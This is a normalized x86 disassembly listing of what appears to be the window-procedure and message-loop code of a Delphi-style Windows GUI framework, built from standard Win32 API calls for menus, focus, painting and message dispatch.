mov eax [ rw-data ]
call sub_406b9c
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f20
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46cb70
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46cb70
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46c09c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_46add0
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46c0fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418314
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_453a88
cmp ebx eax
je r-xdata
sub_46c16c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46c0fc
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418470
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46c284
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418470
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46c320
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c8f4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_46b2dc
mov eax [ rw-data ]
call sub_46b924
sub_46c378
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c3d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c3dc
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404118
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_46c3e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46c420
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46cb70
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_46c46c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_46cb26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46c320
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_46d58c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_418470
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_453a88
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46e4b8
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46d0a8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46d04c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_453a88
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cb70
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_46b924
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_46c3e4
pop ecx
jmp [ eax * 4 + jump_table_46c510 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_453a88
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46cf24
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458444
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46c378
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4205b4
jmp r-xdata
xor eax eax
call sub_46429c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_453a88
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44e340
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cb8c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_46c3e4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_469b24
jmp r-xdata
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
push ebp
call sub_46c420
pop ecx
jmp r-xdata
push ebp
call sub_46c3e4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c284
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cc3c
jmp r-xdata
jmp r-xdata
call sub_43c850
call sub_43c930
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c274
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c284
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c27c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_46414c
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
call sub_464200
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_46c3e4
pop ecx
jmp r-xdata
call sub_43c850
call sub_43c98c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d29c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46cb8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46c274
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_46bba4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_453a88
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_453a88
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46cc3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_46bba4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_453a88
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_46c284
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_453a88
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_4678b0
mov eax [ ebx + 0x44 ]
call sub_469ccc
sub_46cd3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46cd78
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f74
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404010
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46cdc4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46cde8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46ce38
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_44a018
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_453a88
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_46cef0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46de50
sub_46cf24
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_453a88
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_40338c
test al al
jne r-xdata
sub_46cf90
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_46cef0
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46cde8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46ce38
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46cdc4
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46d028
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46cf90
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46d8f8
sub_46d04c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418450
mov eax 0x8
call sub_4026dc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418314
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46d0a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418470
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026fc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418360
jmp r-xdata
sub_46d13c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403670#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_453a64
mov [ esi + 0x44 ] edi
sub_46d1bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46d29a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_4640c4
call sub_407ccc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2a1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_4678b0
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403670#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46d028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_4667b8
mov eax [ ebp - 0x4 ]
call sub_46cb8c
jmp r-xdata
sub_46d2bc
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40278c
push eax
call sub_40276c
pop edx
call sub_40b79c
call sub_40276c
mov edx [ rw-data ]
call sub_40331c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40276c
mov edx eax
mov eax ebx
call sub_46d4b4
pop esi
pop ebx
retn
call sub_40276c
mov ecx eax
mov edx esi
